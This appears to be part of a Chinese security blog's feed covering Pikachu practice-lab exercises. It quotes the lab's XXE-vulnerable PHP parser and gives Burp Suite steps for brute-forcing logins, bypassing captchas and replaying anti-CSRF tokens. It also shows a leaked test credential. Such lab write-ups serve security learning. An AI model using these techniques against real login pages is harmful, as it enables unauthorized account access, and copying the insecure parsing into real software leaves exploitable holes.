 <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">  <span class="comment">//    $xml = $test;</span></span><br><span class="line">  <span class="variable">$data</span> = @<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>具体来说用了simplexml_load_string 函数对 xml 字符串解析成一个对象。</p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pikachu靶场————暴力破解</title>
+    <url>/posts/61262.html</url>
+    <content><![CDATA[<p>使用到的工具：</p>
+<p>BurpSuite</p>
+<h1 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h1><p>通过提示，我们知道答案</p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738027607189-bd41dc16-a8cc-4c52-9139-d52b86a612d7.png"></p>
+<p>我们使用 burpsuite 进行暴力破解</p>
+<p>使用步骤</p>
+<ol>
+<li>拦截网页（intercept）</li>
+<li>发送到 Intruder</li>
+<li>在 Intruder 给用户名密码标注，在 Payloads 设定密码库</li>
+<li>然后进行攻击(attack)</li>
+</ol>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738027869685-c1b8d3f5-f9e3-4721-908b-c9ed6cbcf3b7.png"></p>
+<p>可以看到 admin&#x2F;123456 和 test&#x2F;abc123 接收的长度为 33，相比较于下面 56 的比较小，不过上面是属实不知道乍回事。</p>
+<h1 id="验证码绕过（on-server）"><a href="#验证码绕过（on-server）" class="headerlink" title="验证码绕过（on server）"></a>验证码绕过（on server）</h1><p>提示： 验证码好像一直有效  </p>
+<p>不过我试了一下，在网页直接用原来的验证码不行，所以还是得用 burpsuite 进行拦截。</p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738028136596-0767d937-36d4-4b6d-ab53-2f233797f190.png"></p>
+<p>只需要对这两个进行攻击即可。</p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738028391224-1fd72c3a-8949-4583-a568-78d605354a6e.png"></p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738028409556-86e33eaa-3cc7-4f6d-9bd6-e23a6f8aaf32.png"></p>
+<h1 id="验证码绕过（on-client）"><a href="#验证码绕过（on-client）" class="headerlink" title="验证码绕过（on client）"></a>验证码绕过（on client）</h1><p>这里说是客户端的，就是前端的，那就可以在浏览器上进行修改了，很容易就查到了相关的 js 函数。</p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738028584704-5796f23a-18d6-417b-9c09-df7cd17088f6.png"></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> code; <span class="comment">//在全局 定义验证码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createCode</span>(<span class="params"></span>) &#123;</span><br><span class="line">  code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> codeLength = <span class="number">5</span>;<span class="comment">//验证码的长度</span></span><br><span class="line">  <span class="keyword">var</span> checkCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;checkCode&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> selectChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>);<span class="comment">//所有候选组成验证码的字符，当然也可以用中文的</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; codeLength; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> charIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">36</span>);</span><br><span class="line">    code += selectChar[charIndex];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//alert(code);</span></span><br><span class="line">  <span class="keyword">if</span> (checkCode) &#123;</span><br><span class="line">    checkCode.<span class="property">className</span> = <span class="string">&quot;code&quot;</span>;</span><br><span class="line">    checkCode.<span class="property">value</span> = code;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validate</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> inputCode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#bf_client .vcode&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">if</span> (inputCode.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;请输入验证码！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inputCode != code) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;验证码输入错误！&quot;</span>);</span><br><span class="line">    <span class="title function_">createCode</span>();<span class="comment">//刷新验证码</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_">createCode</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在浏览器上将这里面的 createCode 函数只写一个 return true;即可，然后填上信息，让 burpsuite 来拦截。</p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738029139419-1cdd8aca-6da5-4008-be04-1820b582f36a.png"></p>
+<h1 id="token-防爆破？"><a href="#token-防爆破？" class="headerlink" title="token 防爆破？"></a>token 防爆破？</h1><p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738030434932-9d57aa47-e9a5-481b-82e1-4070dd830631.png"></p>
+<p>在浏览器定位 Login 按钮，发现上方还有这个隐藏（hidden）的输入消息，这里面的 value 值每次刷新都会改变，没看到 js 的代码，应该是服务器自己给的。</p>
+<p>我们通过 burpsuite 拦截一下。</p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738030588852-0e5a3b09-62b3-46c1-9464-4028bcba1f56.png"></p>
+<p>根据其他教程的方法，都是只给 password 和 token 加上$号，是因为我们每次并发量是 1，所以每次发送一个导致速度上不来，所以就不考虑 username 了。（我们这里也一样）</p>
+<p>攻击类型(Attack type)选择 pitchfork。</p>
+<p>给 password 设置为 simple list，给上我们的爆破密码库。</p>
+<p>给 token 设置为 recursive grep（循环查找字符串）（可以用于每次重新获取网站的某个字符串）</p>
+<p>在 Setting 界面（老版本应该是 Option 界面）中的 redirections（重定向）中设置 always（总是）。</p>
+<p>然后再 Setting 界面的 grep(查找字符串) - Extract 点击 Add</p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738032166719-6f267018-f6c5-45c5-82f3-4959e02f2083.png"></p>
+<p>就可以对重定向文本进行定位了。</p>
+<p>最后我们将我们的并发数（concurrent）的最大值设置为 1，每次只发一条请求。</p>
+<p>进行攻击</p>
+<p><img src="/../../img/docs/pikachu/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1738031279722-371c1a59-8575-4e0b-8645-c5df9c544273.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Burpsuite 使用到的功能</p>
+<ol>
+<li>通过 Cluster Bomb 进行账户密码的爆破</li>
+<li>对验证码不变（不进行销毁）的登录框进行 js 修改（client），最后爆破。</li>
+<li>对需要 token 验证的登录框，进行 Pitchfork 进行重定向文本爆破。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>敏感信息泄露</title>
+    <url>/posts/2190.html</url>
+    <content><![CDATA[<p>它这里是一个登录界面，由于这章的原因，所以我们就不找 SQL 的注入点了。</p>
+<h1 id="敏感信息一"><a href="#敏感信息一" class="headerlink" title="敏感信息一"></a>敏感信息一</h1><p>我们用浏览器的查看器，定位到登录框，就可以看到有一行注释，就泄露了一个测试账号的账号密码。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">测试账号:lili/<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="敏感信息二"><a href="#敏感信息二" class="headerlink" title="敏感信息二"></a>敏感信息二</h1><p>我们把 php 那个文件名删掉，可以看到一个目录，这也是敏感信息泄露。</p>
+<p><img src="/../../img/docs/pikachu/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/1738574032795-677e22e9-b509-4456-8d35-eb5091bbd6d6.png"></p>
 ]]></content>
       <categories>
         <category>网安</category>
